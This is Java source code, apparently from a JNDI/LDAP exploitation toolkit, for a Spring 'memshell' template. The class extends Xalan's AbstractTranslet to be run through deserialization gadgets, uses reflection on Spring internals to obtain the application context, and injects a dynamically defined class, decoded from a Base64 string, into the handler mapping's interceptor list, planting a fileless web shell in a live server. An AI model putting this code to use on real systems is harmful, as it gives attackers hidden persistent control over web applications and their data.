package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.LinkedHashSet;

// for JDK 17 and above

// when using SpringMemshellTemplate2,
// java.lang.reflect.InaccessibleObjectException:
// Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(byte[],int,int) throws java.lang.ClassFormatError accessible:
// module java.base does not "opens java.lang" to unnamed module @c730b35
public class SpringMemshellTemplate0 extends AbstractTranslet {

    public SpringMemshellTemplate0(){
        // for JDK 17 and above
        System.out.println("[+] Add Dynamic Interceptor0");

        try{
            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
            java.lang.reflect.Field field = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            // 2. 属性被 private 修饰，所以 setAccessible true
            System.out.println("field.setAccessible(true);");
            field.setAccessible(true);
            // 3. 获取一个 ApplicationContext 实例
            WebApplicationContext context =(WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();

            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            try{
                System.out.println("classLoader.loadClass(\"org.joychou.controller.DynamicInterceptorTemplate0\");");
                clazz = classLoader.loadClass("org.joychou.controller.DynamicInterceptorTemplate0");
            }catch(ClassNotFoundException e){
                try{
                    String codeClass = "";
                    byte[] bytes = java.util.Base64.getDecoder().decode(codeClass);

//                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                    method.setAccessible(true);
//                    clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
                    System.out.println("java.lang.invoke.MethodHandles.lookup().defineClass(bytes);");
                    MethodHandles.Lookup lookup = java.lang.invoke.MethodHandles.lookup();
                    Method method = MethodHandles.Lookup.class.getMethod("defineClass", byte[].class);
                    clazz = (Class) method.invoke(lookup, bytes);
                }catch (Exception ex){
                    ex.printStackTrace();
                }
            }

            adaptedInterceptors.add(clazz.newInstance());
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
